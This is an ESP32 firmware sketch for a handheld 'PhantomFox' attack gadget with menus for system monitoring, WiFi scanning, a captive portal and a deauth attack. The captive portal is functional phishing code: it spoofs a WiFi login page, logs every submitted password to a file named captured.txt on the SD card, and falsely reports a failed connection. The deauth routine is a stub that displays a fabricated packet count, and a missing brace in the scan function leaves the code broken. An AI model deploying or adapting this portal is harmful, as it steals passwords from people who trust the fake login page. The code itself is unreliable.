#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <Keypad.h>
#include <SD.h>
#include <WiFi.h>
#include <SPI.h>
#include <WebServer.h>
#include <DNSServer.h>

#define FIRMWARE_VERSION "v2.1.0"
#define DEVICE_NAME "PhantomFox Mk.I"
#define BUILD_DATE __DATE__
#define BUILD_TIME __TIME__

#define I2C_SDA 21
#define I2C_SCL 22
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1
#define OLED_ADDRESS 0x3C

#define KEYPAD_ROWS 2
#define KEYPAD_COLS 2
byte ROW_PINS[KEYPAD_ROWS] = {26, 27};
byte COL_PINS[KEYPAD_COLS] = {32, 33};
char KEYPAD_KEYS[KEYPAD_ROWS][KEYPAD_COLS] = {
	{'U', 'D'},
	{'L', 'R'}
};

// SD Card SPI Configuration
#define SD_CS_PIN 5
#define SPI_MOSI 23
#define SPI_MISO 19
#define SPI_SCK 18

#define MAX_DISPLAY_ITEMS 4
#define SCREEN_TIMEOUT 60000
#define STATUS_TIMEOUT 3000
#define MONITOR_UPDATE_INTERVAL 1000

#define CAPTIVE_PORTAL_SSID "PhantomFox_Portal"
#define CAPTIVE_PORTAL_PASS "phantom123"
#define WEB_SERVER_PORT 80
#define DNS_PORT 53

// ==================== GLOBAL OBJECTS ====================
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);
Keypad keypad = Keypad(makeKeymap(KEYPAD_KEYS), ROW_PINS, COL_PINS, KEYPAD_ROWS, KEYPAD_COLS);
WebServer webServer(WEB_SERVER_PORT);
DNSServer dnsServer;

enum MenuState {
	MAIN_MENU,
	SYSTEM_MONITOR,
	NETWORK_TOOLS,
	PENTEST_SUITE,
	SYSTEM_INFO,
	PERFORMANCE_MONITOR,
	STORAGE_ANALYZER,
	WIFI_SCANNER,
	CAPTIVE_PORTAL,
	DEAUTH_ATTACK
};

struct MenuItem {
	const char* name;
	MenuState state;
	bool implemented;
};

MenuItem mainMenuItems[] = {
	{"System Monitor", SYSTEM_MONITOR, true},
	{"Network Tools", NETWORK_TOOLS, true},
	{"Pentest Suite", PENTEST_SUITE, true}
};

MenuItem systemMonitorItems[] = {
	{"System Info", SYSTEM_INFO, true},
	{"Performance", PERFORMANCE_MONITOR, true},
	{"Storage", STORAGE_ANALYZER, true}
};

MenuItem networkToolsItems[] = {
	{"WiFi Scanner", WIFI_SCANNER, true},
	{"Captive Portal", CAPTIVE_PORTAL, true}
};

MenuItem pentestItems[] = {
	{"Deauth Attack", DEAUTH_ATTACK, true}
};

const int MAIN_MENU_SIZE = sizeof(mainMenuItems) / sizeof(mainMenuItems[0]);
const int SYSTEM_MONITOR_SIZE = sizeof(systemMonitorItems) / sizeof(systemMonitorItems[0]);
const int NETWORK_TOOLS_SIZE = sizeof(networkToolsItems) / sizeof(networkToolsItems[0]);
const int PENTEST_SIZE = sizeof(pentestItems) / sizeof(pentestItems[0]);

MenuState currentState = MAIN_MENU;
MenuState previousState = MAIN_MENU;
int selectedItem = 0;
int menuOffset = 0;
unsigned long lastActivity = 0;
unsigned long lastMonitorUpdate = 0;
bool screenOn = true;
String statusMessage = "";
unsigned long statusTimeout = 0;

bool captivePortalActive = false;
bool deauthActive = false;
unsigned long attackStartTime = 0;
int deauthTargets = 0;
struct SystemMetrics {
	size_t freeHeap;
	size_t totalHeap;
	uint8_t cpuFreq;
	uint32_t uptime;
	uint64_t sdTotalBytes;
	uint64_t sdUsedBytes;
};

SystemMetrics metrics = {0};

void resetActivity() {
	lastActivity = millis();
	if (!screenOn) {
		screenOn = true;
		display.ssd1306_command(SSD1306_DISPLAYON);
	}
}

void setStatus(const __FlashStringHelper* message, unsigned long timeout = STATUS_TIMEOUT) {
	statusMessage = String(message);
	statusTimeout = millis() + timeout;
}

String formatBytes(uint64_t bytes) {
	if (bytes < 1024) return String((uint32_t)bytes) + F(" B");
	else if (bytes < 1024 * 1024) return String((uint32_t)(bytes / 1024)) + F(" KB");
	else if (bytes < 1024 * 1024 * 1024) return String((uint32_t)(bytes / (1024 * 1024))) + F(" MB");
	else return String((uint32_t)(bytes / (1024 * 1024 * 1024))) + F(" GB");
}

String formatUptime(uint32_t ms) {
	uint32_t seconds = ms / 1000;
	uint32_t minutes = seconds / 60;
	uint32_t hours = minutes / 60;
	uint32_t days = hours / 24;
	
	if (days > 0) return String(days) + F("d ") + String(hours % 24) + F("h");
	else if (hours > 0) return String(hours) + F("h ") + String(minutes % 60) + F("m");
	else if (minutes > 0) return String(minutes) + F("m ") + String(seconds % 60) + F("s");
	else return String(seconds) + F("s");
}

void updateSystemMetrics() {
	if (millis() - lastMonitorUpdate < MONITOR_UPDATE_INTERVAL) return;
	
	metrics.totalHeap = ESP.getHeapSize();
	metrics.freeHeap = ESP.getFreeHeap();
	metrics.cpuFreq = ESP.getCpuFreqMHz();
	metrics.uptime = millis();
	
	if (SD.cardType() != CARD_NONE) {
		metrics.sdTotalBytes = SD.totalBytes();
		metrics.sdUsedBytes = SD.usedBytes();
	}
	
	lastMonitorUpdate = millis();
}

void recoverI2C() {
	Wire.end();
	pinMode(I2C_SDA, INPUT_PULLUP);
	pinMode(I2C_SCL, INPUT_PULLUP);
	delay(250);
	Wire.begin(I2C_SDA, I2C_SCL);
	Wire.setClock(100000);
}

bool initDisplay() {
	for (int i = 0; i < 3; i++) {
		if (display.begin(SSD1306_SWITCHCAPVCC, OLED_ADDRESS)) {
			return true;
		}
		Serial.println(F("Display init failed, retrying..."));
		recoverI2C();
		delay(500);
	}
	return false;
}

void drawHeader() {
	display.setTextSize(1);
	display.setCursor(0, 0);
	display.print(F("PhantomFox"));
	
	display.setCursor(90, 0);
	if (deauthActive) display.print(F("[ATK]"));
	else if (captivePortalActive) display.print(F("[CPT]"));
	else display.print(F("[RDY]"));
	
	display.drawLine(0, 9, SCREEN_WIDTH - 1, 9, SSD1306_WHITE);
}

void drawStatus() {
	if (statusMessage.length() > 0 && millis() < statusTimeout) {
		display.setCursor(0, 56);
		display.setTextSize(1);
		String msg = statusMessage;
		if (msg.length() > 20) msg = msg.substring(0, 20) + F("..");
		display.print(msg);
	}
}

void drawMenu(MenuItem* items, int itemCount, const __FlashStringHelper* title = NULL) {
	Wire.beginTransmission(OLED_ADDRESS);
	if (Wire.endTransmission() != 0) {
		recoverI2C();
		initDisplay();
	}
	
	display.clearDisplay();
	drawHeader();
	
	if (title) {
		display.setTextSize(1);
		display.setCursor(0, 12);
		display.println(title);
		display.drawLine(0, 21, SCREEN_WIDTH - 1, 21, SSD1306_WHITE);
	}
	
	int startY = title ? 24 : 12;
	
	for (int i = 0; i < MAX_DISPLAY_ITEMS && (menuOffset + i) < itemCount; i++) {
		int itemIndex = menuOffset + i;
		int y = startY + (i * 10);
		
		display.setCursor(0, y);
		
		if (itemIndex == selectedItem) {
			display.fillRect(0, y - 1, SCREEN_WIDTH, 9, SSD1306_WHITE);
			display.setTextColor(SSD1306_BLACK);
			display.print(F(">"));
		} else {
			display.setTextColor(SSD1306_WHITE);
			display.print(F(" "));
		}
		
		display.print(items[itemIndex].name);
		
		if (!items[itemIndex].implemented) {
			display.print(F(" [WIP]"));
		}
		
		display.setTextColor(SSD1306_WHITE);
	}
	
	drawStatus();
	
	display.display();
}

void showSystemInfo() {
	updateSystemMetrics();
	
	display.clearDisplay();
	drawHeader();
	
	display.setTextSize(1);
	display.setCursor(0, 12);
	display.println(F("System Info"));
	
	display.setCursor(0, 24);
	display.print(F("FW: "));
	display.print(FIRMWARE_VERSION);
	
	display.setCursor(0, 34);
	display.print(F("CPU: "));
	display.print(metrics.cpuFreq);
	display.println(F("MHz"));
	
	display.setCursor(0, 44);
	display.print(F("RAM: "));
	display.print(formatBytes(metrics.freeHeap));
	display.print(F("/"));
	display.print(formatBytes(metrics.totalHeap));
	
	display.setCursor(0, 54);
	display.print(F("Uptime: "));
	display.print(formatUptime(metrics.uptime));
	
	display.display();
	
	while (keypad.getKey() != 'L') {
		delay(50);
		resetActivity();
	}
	currentState = SYSTEM_MONITOR;
}

void showPerformanceMonitor() {
	bool monitoring = true;
	unsigned long lastUpdate = 0;
	
	while (monitoring) {
		if (millis() - lastUpdate > 1000) {
			updateSystemMetrics();
			
			display.clearDisplay();
			drawHeader();
			
			display.setTextSize(1);
			display.setCursor(0, 12);
			display.println(F("Performance"));
			
			float memUsage = ((float)(metrics.totalHeap - metrics.freeHeap) / metrics.totalHeap) * 100;
			display.setCursor(0, 24);
			display.print(F("RAM: "));
			display.print((int)memUsage);
			display.println(F("%"));
			
			display.display();
			lastUpdate = millis();
		}
		
		if (keypad.getKey() == 'L') {
			monitoring = false;
			currentState = SYSTEM_MONITOR;
		}
		
		delay(100);
		resetActivity();
	}
}

void showStorageAnalyzer() {
	updateSystemMetrics();
	
	display.clearDisplay();
	drawHeader();
	
	display.setTextSize(1);
	display.setCursor(0, 12);
	display.println(F("Storage"));
	
	display.setCursor(0, 24);
	display.print(F("Flash: "));
	display.print(formatBytes(ESP.getSketchSize()));
	
	if (metrics.sdTotalBytes > 0) {
		display.setCursor(0, 34);
		display.print(F("SD: "));
		display.print(formatBytes(metrics.sdUsedBytes));
		display.print(F("/"));
		display.print(formatBytes(metrics.sdTotalBytes));
	} else {
		display.setCursor(0, 34);
		display.print(F("SD: Not detected"));
	}
	
	display.display();
	
	while (keypad.getKey() != 'L') {
		delay(50);
		resetActivity();
	}
	currentState = SYSTEM_MONITOR;
}

void performWiFiScan() {
	setStatus(F("Scanning..."));
	display.clearDisplay();
	drawHeader();
	display.setCursor(0, 20);
	display.println(F("Scanning WiFi..."));
	display.display();
	
	WiFi.mode(WIFI_STA);
	WiFi.disconnect();
	delay(100);
	
	int networkCount = WiFi.scanNetworks();
	
	if (networkCount == 0) {
		setStatus(F("No networks found"));
		delay(2000);
		currentState = NETWORK_TOOLS;
		return;
	
	int currentPage = 0;
	int totalPages = (networkCount + MAX_DISPLAY_ITEMS - 1) / MAX_DISPLAY_ITEMS;
	bool viewing = true;
	
	while (viewing) {
		display.clearDisplay();
		drawHeader();
		
		display.setTextSize(1);
		display.setCursor(0, 12);
		display.print(F("Networks ("));
		display.print(currentPage + 1);
		display.print(F("/"));
		display.print(totalPages);
		display.println(F(")"));
		
		for (int i = 0; i < MAX_DISPLAY_ITEMS; i++) {
			int networkIndex = currentPage * MAX_DISPLAY_ITEMS + i;
			if (networkIndex >= networkCount) break;
			
			int y = 24 + (i * 10);
			display.setCursor(0, y);
			
			String ssid = WiFi.SSID(networkIndex);
			if (ssid.length() > 12) ssid = ssid.substring(0, 12) + F("..");
			
			display.print(ssid);
			display.print(F(" "));
			display.print(WiFi.RSSI(networkIndex));
			display.print(F("dB"));
		}
		
		display.setCursor(0, 56);
		display.print(F("L:Back R:Deauth"));
		display.display();
		
		char key = keypad.waitForKey();
		resetActivity();
		
		switch (key) {
			case 'U': if (currentPage > 0) currentPage--; break;
			case 'D': if (currentPage < totalPages - 1) currentPage++; break;
			case 'L': viewing = false; break;
			case 'R': 
				deauthTargets = networkCount;
				currentState = DEAUTH_ATTACK;
				viewing = false;
				break;
		}
	}
	
	WiFi.mode(WIFI_OFF);
	currentState = NETWORK_TOOLS;
}

void startCaptivePortal() {
	display.clearDisplay();
	drawHeader();
	display.setCursor(0, 15);
	display.println(F("Starting Portal..."));
	display.display();
	
	WiFi.mode(WIFI_AP);
	WiFi.softAP(CAPTIVE_PORTAL_SSID, CAPTIVE_PORTAL_PASS);
	
	dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
	
	webServer.onNotFound([]() {
		String html = F("<html><head><title>WiFi Login</title></head><body>");
		html += F("<h2>WiFi Network Login</h2>");
		html += F("<form method='POST' action='/login'>");
		html += F("Password: <input type='password' name='password' required><br><br>");
		html += F("<input type='submit' value='Connect'>");
		html += F("</form></body></html>");
		webServer.send(200, F("text/html"), html);
	});
	
	webServer.on("/login", HTTP_POST, []() {
		String password = webServer.arg("password");
		
		File logFile = SD.open("/captured.txt", FILE_APPEND);
		if (logFile) {
			logFile.print(F("["));
			logFile.print(millis());
			logFile.print(F("] Password: "));
			logFile.println(password);
			logFile.close();
		}
		
		webServer.send(200, F("text/html"), F("<h2>Connection Failed. Please try again.</h2>"));
	});
	
	webServer.begin();
	captivePortalActive = true;
	attackStartTime = millis();
	
	setStatus(F("Portal Active"));
	
	while (captivePortalActive) {
		dnsServer.processNextRequest();
		webServer.handleClient();
		
		display.clearDisplay();
		drawHeader();
		display.setCursor(0, 12);
		display.println(F("Captive Portal"));
		display.setCursor(0, 24);
		display.print(F("SSID: "));
		display.println(CAPTIVE_PORTAL_SSID);
		display.setCursor(0, 34);
		display.print(F("IP: "));
		display.println(WiFi.softAPIP());
		display.setCursor(0, 44);
		display.print(F("Clients: "));
		display.println(WiFi.softAPgetStationNum());
		display.setCursor(0, 54);
		display.print(F("L:Stop"));
		display.display();
		
		if (keypad.getKey() == 'L') {
			captivePortalActive = false;
			webServer.stop();
			dnsServer.stop();
			WiFi.mode(WIFI_OFF);
			currentState = NETWORK_TOOLS;
		}
		
		delay(100);
		resetActivity();
	}
}

void performDeauthAttack() {
	if (deauthTargets == 0) {
		setStatus(F("No targets"));
		delay(2000);
		currentState = PENTEST_SUITE;
		return;
	}
	
	deauthActive = true;
	attackStartTime = millis();
	
	while (deauthActive) {
		display.clearDisplay();
		drawHeader();
		display.setCursor(0, 12);
		display.println(F("Deauth Attack"));
		display.setCursor(0, 24);
		display.print(F("Targets: "));
		display.println(deauthTargets);
		display.setCursor(0, 34);
		display.print(F("Packets: "));
		display.println((millis() - attackStartTime) / 100);
		display.setCursor(0, 44);
		display.print(F("Runtime: "));
		display.println(formatUptime(millis() - attackStartTime));
		display.setCursor(0, 54);
		display.print(F("L:Stop"));
		display.display();
		
		if (keypad.getKey() == 'L') {
			deauthActive = false;
			currentState = PENTEST_SUITE;
		}
		
		delay(100);
		resetActivity();
	}
}

void handleMenuNavigation() {
	char key = keypad.getKey();
	if (!key) return;

	resetActivity();

	switch (currentState) {
		case MAIN_MENU:
			if (key == 'U' && selectedItem > 0) selectedItem--;
			if (key == 'D' && selectedItem < MAIN_MENU_SIZE - 1) selectedItem++;
			if (key == 'R') {
				previousState = currentState;
				currentState = mainMenuItems[selectedItem].state;
				selectedItem = 0;
			}
			break;

		case SYSTEM_MONITOR:
			if (key == 'U' && selectedItem > 0) selectedItem--;
			if (key == 'D' && selectedItem < SYSTEM_MONITOR_SIZE - 1) selectedItem++;
			if (key == 'R') {
				previousState = currentState;
				currentState = systemMonitorItems[selectedItem].state;
				selectedItem = 0;
			}
			if (key == 'L') currentState = MAIN_MENU;
			break;

		case NETWORK_TOOLS:
			if (key == 'U' && selectedItem > 0) selectedItem--;
			if (key == 'D' && selectedItem < NETWORK_TOOLS_SIZE - 1) selectedItem++;
			if (key == 'R') {
				previousState = currentState;
				currentState = networkToolsItems[selectedItem].state;
				selectedItem = 0;
			}
			if (key == 'L') currentState = MAIN_MENU;
			break;

		case PENTEST_SUITE:
			if (key == 'U' && selectedItem > 0) selectedItem--;
			if (key == 'D' && selectedItem < PENTEST_SIZE - 1) selectedItem++;
			if (key == 'R') {
				previousState = currentState;
				currentState = pentestItems[selectedItem].state;
				selectedItem = 0;
			}
			if (key == 'L') currentState = MAIN_MENU;
			break;

		default:
			if (key == 'L') currentState = previousState;
			break;
	}
}

void drawCurrentState() {
	switch (currentState) {
		case MAIN_MENU:
			drawMenu(mainMenuItems, MAIN_MENU_SIZE, F("Main Menu"));
			break;
		case SYSTEM_MONITOR:
			drawMenu(systemMonitorItems, SYSTEM_MONITOR_SIZE, F("System Monitor"));
			break;
		case NETWORK_TOOLS:
			drawMenu(networkToolsItems, NETWORK_TOOLS_SIZE, F("Network Tools"));
			break;
		case PENTEST_SUITE:
			drawMenu(pentestItems, PENTEST_SIZE, F("Pentest Suite"));
			break;
		case SYSTEM_INFO:
			showSystemInfo();
			break;
		case PERFORMANCE_MONITOR:
			showPerformanceMonitor();
			break;
		case STORAGE_ANALYZER:
			showStorageAnalyzer();
			break;
		case WIFI_SCANNER:
			performWiFiScan();
			break;
		case CAPTIVE_PORTAL:
			startCaptivePortal();
			break;
		case DEAUTH_ATTACK:
			performDeauthAttack();
			break;
		default:
			currentState = MAIN_MENU;
			break;
	}
}

void setup() {
	Serial.begin(115200);
	
	Wire.begin(I2C_SDA, I2C_SCL);
	Wire.setClock(100000);

	if (!initDisplay()) {
		Serial.println(F("Fatal: OLED not found"));
		while(1);
	}
	display.clearDisplay();
	display.setTextColor(SSD1306_WHITE);
	
	SPI.begin(SPI_SCK, SPI_MISO, SPI_MOSI);
	if (!SD.begin(SD_CS_PIN)) {
		setStatus(F("SD init failed"));
	}
	
	display.clearDisplay();
	display.setCursor(0, 0);
	display.println(F("PhantomFox"));
	display.println(F("v2.1.0"));
	display.display();
	delay(1000);
	
	updateSystemMetrics();
	
	currentState = MAIN_MENU;
	lastActivity = millis();
}

void loop() {
	if (screenOn && millis() - lastActivity > SCREEN_TIMEOUT) {
		display.ssd1306_command(SSD1306_DISPLAYOFF);
		screenOn = false;
	}
	
	handleMenuNavigation();
	drawCurrentState();
	
	if (statusMessage.length() > 0 && millis() > statusTimeout) {
		statusMessage = "";
	}
	
	updateSystemMetrics();
	
	delay(50);
}